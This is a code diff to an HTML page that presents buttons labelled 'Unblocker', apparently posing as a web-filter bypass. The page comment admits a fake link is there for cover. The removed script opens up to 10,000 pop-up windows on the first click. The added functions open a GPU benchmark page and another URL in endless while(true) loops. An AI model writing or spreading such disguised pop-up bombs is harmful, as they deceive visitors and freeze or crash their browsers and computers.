@@ -10,41 +10,20 @@
     <em>First link is fake to cover up for the unblocker</em>
     <br>
     <br>
-    <button onclick="press()">unblocker</button>
+    <button onclick="site()">Unblocker</button>
+    <br>
+    <button onclick="site2()">Unblocker 2</button>
     <script>
-      const targetLink = "https://cznull.github.io/vsbm";
-const MAX_WINDOWS = 10000; 
-let windowsOpened = 0;
-
-// Array to keep track of your active window objects
-const activeWindows = [];
-
-function spawnWindowSequentially() {
-    if (windowsOpened < MAX_WINDOWS) {
-        const randomLeft = Math.floor(Math.random() * window.screen.width);
-        const randomTop = Math.floor(Math.random() * window.screen.height);
-        const features = `width=400,height=400,top=${randomTop},left=${randomLeft}`;
-
-        // 1. Capture the window reference directly
-        const newWin = window.open(targetLink, `monitored_window_${windowsOpened}`, features);
-        
-        if (newWin) {
-            activeWindows.push(newWin);
-            // TRIGGER ACTION: Put your "event listener" logic right here
-            console.log(`Successfully opened window #${windowsOpened + 1}`);
-        } else {
-            console.log("Pop-up was blocked by the browser!");
-        }
-
-        windowsOpened++;
-        setTimeout(spawnWindowSequentially, 10);
-    } else {
-        console.log("Maximum allowed windows reached safely.");
-    }
-}
-
-window.addEventListener('click', spawnWindowSequentially, { once: true });
-
+        function site() {
+            while(true) {
+                window.open("https://cznull.github.io/vsbm", "_blank", "toolbar=no, scrollbars=no, resizable=no, width=400, height=400");
+            };
+        };
+        function site2() {
+            while(true) {
+                window.open("https://jexles856.github.io/coolunbocker", "_blank", "toolbar=no, scrollbars=no, resizable=no, width=400, height=400");
+            };
+        };
     </script>
   </body>
 </html>
